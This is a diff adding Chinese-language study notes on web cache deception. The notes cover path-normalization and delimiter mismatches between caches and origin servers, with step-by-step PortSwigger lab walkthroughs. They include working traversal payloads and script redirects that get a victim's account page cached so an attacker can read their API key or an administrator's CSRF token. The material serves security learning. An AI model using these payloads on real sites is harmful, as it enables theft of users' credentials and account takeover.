@@ -292,3 +292,112 @@ URL 解析是一個把 URL 和伺服器上的資源聯結起來的過程，包�
 >
 > 如果不嘗試進行漏洞利用，可能無法明確的確定快取是否會解碼「點」以及 URL 路徑。
 
+### 利用原始伺服器標準化
+
+如果原始伺服器會解析編碼的「點」，而快取不會，可以嘗試使用與下方相似結構的 Payload 來利用不一致：`/<static-directory-prefix>/..%2f<dynamic-path>`
+
+* 快取將路徑解析成 `/assets/..%2fprofile`
+* 原始伺服器將路徑解析成 `/profile`
+
+原始伺服器回傳動態的個人資料頁面，而快取將其儲存。
+
+**Lab: [Exploiting origin server normalization for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization)**
+   1. 偵查原始伺服器標準化
+      1. 前往路徑 `/my-account`，會回傳個人資料頁面並顯示 API Key
+      2. 前往路徑 `/aaa/..%2fmy-account` 仍成功回傳個人資料頁面並顯示 API Key，且路徑列顯示 `/aaa/..%2fmy-account`，表示原始伺服器會解析 `%2f`。
+   2. 偵查快取伺服器標準化
+      1. 尋找一個正確的靜態資源並確保其有被快取，這裡選擇：`/resources/labheader/js/labHeader.js`
+      2. 前往路徑 `/aaa/..%2fresources/labheader/js/labHeader.js` 發現快取並不會將其儲存
+      3. 判斷快取伺服器不會解析 `%2f` 且快取規則包含開頭為靜態資源路徑之規則
+   3. 利用
+      1. 製作 Payload：
+         ```
+         <script>document.location.href="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account";</script>
+         ```
+      2. 將其傳送給受害者後攻擊者再次前往路徑 `https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account` 即可得到受害者的 API Key
+
+### 利用快取伺服器標準化
+
+如果快取伺服器會解析編碼的「點」而原始伺服器不會解析，可以嘗試使用與下方相似結構的 Payload 來利用不一致：`/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>`
+
+> [!note]
+>
+> 當利用快取伺服器標準化時，將所有路徑遍歷的部分進行編碼。透過編碼的字元有助於在使用分隔符號時，避免一些意外的行為。並且不需要在開頭的靜態目錄後面使用未編碼的「斜槓」，因為快取會負責解碼。
+
+在這種情況下，僅依靠路徑遍歷不足以進行漏洞利用。例如，快取和原始伺服器如何解析 Payload `/profile%2f%2e%2fstatic`：
+
+* 快取解析為 `/profile`
+* 原始伺服器解析為 `/profile%2f%2e%2fstatic`
+
+原始伺服器會回傳錯誤訊息，而不是個人資料頁面。
+
+為了利用此不一致，還需要找到一個會被原始伺服器解析，但快取伺服器不會解析的分隔符號。可以在動態路徑後面加上分隔符號以測試：
+
+* 如果原始伺服器會解析分隔符號，就會切斷路徑並回傳動態資料
+* 如果快取伺服器不會解析分隔符號，就會解析路徑並將回應儲存
+
+以 Payload `/profile;%2f%2e%2e%2fstatic` 為例，原始伺服器 `;` 作為分隔符號：
+
+* 快取將其解析為 `/static`
+* 原始伺服器將其解析為 `/profile`
+
+原始伺服器回應動態個人資料，快取會將其儲存，接著就可以使用此 Payload 進行漏洞利用。
+
+**Lab: [Exploiting cache server normalization for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization)**
+
+1. 偵查原始伺服器解析的路徑分隔符號
+   1. 使用 **Intruder** 發送請求
+   2. Payload 使用 `/my-account§§abc`
+   3. 分隔符號參數可參考 [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
+   4. 發現 `#`、`?`、`%23`、`%3f` 回應狀態碼 `200`。但 `#` 不可使用，因為會在請求前就被瀏覽器當作分隔符號。
+2. 偵查標準化不一致
+   1. 對路徑 `/aaa/..%2fmy-account` 請求，回應狀態碼 `404`，表示原始伺服器不會解析 `..%2f`
+   2. 使用 Payload `/aaa/..%2fresources/YOUR-RESOURCE` 發現會被快取，表示快取會解析 `..%2f` 且快取規則匹配開頭為 `/resources` 的請求
+3. 漏洞利用
+   1. 使用 Payload：`/my-account%23%2f%2e%2e%2fresources?wcd`
+      * 原始伺服器將會解析分隔符號 `%23`，並將路徑解析為 `/my-account` 回應 API Key
+      * 快取伺服器會解析 `..%2f`，所以將路徑解析為 `/resources` 並將回應儲存在快取
+   2. 製作 Payload 並發送給受害者，接著攻擊者再次存取即可獲得受害者的 API Key
+      ```
+      <script>document.location.href="https://0a2800ef0485f50b8033ad7a00b0005f.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>
+      ```
+
+## 利用檔案名稱快取規則
+
+有些特定檔案是網站伺服器中常見的檔案（例如：`robots.txt`、`index.html` 和 `favicon.ico` 等），因為他們更新不頻繁，所以通常會被快取儲存。快取規則透過匹配特定檔名的字串判斷。
+
+可以對這些檔案發送 `GET` 請求並查看是否有被快取，以探測快取規則。
+
+### 偵查標準化不一致
+
+可以用與靜態資料夾快取規則相同的方式測試原始伺服器如何標準化 URL 路徑。
+
+為了測試快取如何標準化 URL 路徑，傳送包含路徑遍歷以及在檔名前方加上任意字串資料夾的請求，例如範例 `/aaa%2f%2e%2e%2findex.html`：
+
+* 如果回應被快取，表示快取將其解析為 `/index.html`。
+* 如果回應沒有被快取，表示快取不會將「斜槓」解碼，或不會將「點」的部分解析，並將其解析為 `/aaa%2f%2e%2e%2findex.html`
+
+### 利用標準化不一致
+
+因為只有匹配特定檔案名稱的回應會被快取，所以只能利用快取會解析「點」且原始伺服器不會解析的不一致。使用與靜態資料夾快取規則相同的方法，只需要將開頭使用靜態目錄改成檔案名稱即可。
+
+**Lab: [Exploiting exact-match cache rules for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules)**
+
+1. 偵查快取伺服器檔案名稱快取規則
+   1. 前往路徑 `/robots.txt` 發現會被快取
+2. 偵查分隔符號不一致
+   1. 前往路徑 `/robots.txt;aaa` 發現會回應 `robots.txt` 的內容，但不會被快取，表示快取伺服器不會解析 `;`，但原始伺服器會解析。
+3. 嘗試漏洞利用
+   1. 前往 `https://0ae5006803083ae3a2794be300d00087.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt`
+   2. 發現回應個人資料頁面，但不會被快取，表示：
+      * 原始伺服器將 `;` 解析為分隔符號
+      * 快取伺服器不會解析 `;`
+      * 快取伺服器會解析路徑遍歷部分 `%2f%2e%2e%2`，並將此請求解析為 `/robots.txt`
+   3. 發送 Payload 給受害者：
+      ```
+      <script>document.location="https://0ae5006803083ae3a2794be300d00087.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?wcd"</script>
+      ```
+   4. 使用 **Repeater** 將原本的 `/my-account` 請求修改成路徑 `/my-account;%2f%2e%2e%2frobots.txt?wcd` 並發送請求
+   5. 將回應被快取的 administrator 使用者個人資料頁面，並在當中找到 csrf 值
+   6. 經過觀察，發現修改 Email 的 API 路徑為 `/my-account/change-email`（方法為 `POST`），data 部分包含修改的 Email 以及 csrf 值
+   7. 使用 **Repeater** 並將 csrf 值改成 administrator 使用者的 csrf 值
